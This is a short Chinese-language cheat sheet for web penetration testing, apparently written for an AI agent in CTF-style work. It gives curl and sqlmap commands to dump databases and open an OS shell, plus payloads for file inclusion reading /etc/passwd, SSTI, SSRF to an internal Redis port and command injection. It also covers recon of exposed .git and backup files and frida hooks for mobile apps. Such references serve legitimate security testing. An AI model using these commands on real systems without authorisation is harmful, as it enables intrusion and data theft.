# Web

> 已装：`curl sqlmap python(requests) frida`
> **Burp Suite 是 GUI，Agent 用不了**，改用 `curl` / python `requests`；需要辣味操作时手写脚本。

## 手工请求
```bash
curl -i http://t/                                   # 响应头
curl -s -X POST http://t/login -d "user=admin&pass=1"
curl -s -b "session=xxx" http://t/admin             # 带 cookie
curl -s -H "Content-Type: application/json" -d '{"a":1}' http://t/api
```
python（requests 已装）：
```python
import requests
r = requests.get("http://t/?id=1", timeout=10)
print(r.status_code, r.text[:800])
```

## sqlmap（加 --batch 免交互）
```bash
sqlmap -u "http://t/?id=1" --batch --dbs
sqlmap -u "http://t/?id=1" --batch -D db -T users --dump
sqlmap -u "http://t/?id=1" --batch --os-shell
```

## 常见漏洞（按频率）
1. **SQL 注入** — sqlmap / 手工 union、报错注入
2. **文件包含 LFI/RFI** — `?file=../../etc/passwd`、`php://filter`
3. **文件上传** — 改后缀/Content-Type/魔术字节、`.phtml`
4. **SSTI** — `{{7*7}}`、`${7*7}`（Jinja2/Twig）
5. **SSRF** — `?url=http://127.0.0.1:6379`
6. **命令执行** — `;ls`、`|whoami`、`$(id)`
7. **反序列化** — Python pickle / PHP unserialize / Java

## 信息收集（都可用 curl）
```bash
curl -s http://t/robots.txt
curl -s http://t/.git/config
curl -sI http://t/                        # 响应头
```
看源码注释、备份文件 `index.php.bak`/`~`、cookie。

## 移动端抓包
frida 已装：`frida-ps -U`、`frida -U -f pkg -l hook.js`。r0capture 未装（git/pip 自取）。
